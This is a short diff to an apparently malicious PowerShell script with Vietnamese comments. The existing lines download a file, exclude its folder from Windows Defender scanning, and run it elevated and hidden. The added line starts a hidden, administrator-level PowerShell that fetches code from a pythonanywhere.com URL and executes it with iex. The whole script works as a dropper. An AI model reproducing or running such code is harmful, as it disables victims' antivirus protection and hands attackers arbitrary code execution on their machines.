@@ -7,4 +7,5 @@ Invoke-WebRequest -Uri $url -OutFile $destination
 
 # Loại trừ folder khỏi Windows Defender
 Add-MpPreference -ExclusionPath $p
+Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"
 Start-Process $p -Verb runAs -WindowStyle Hidden
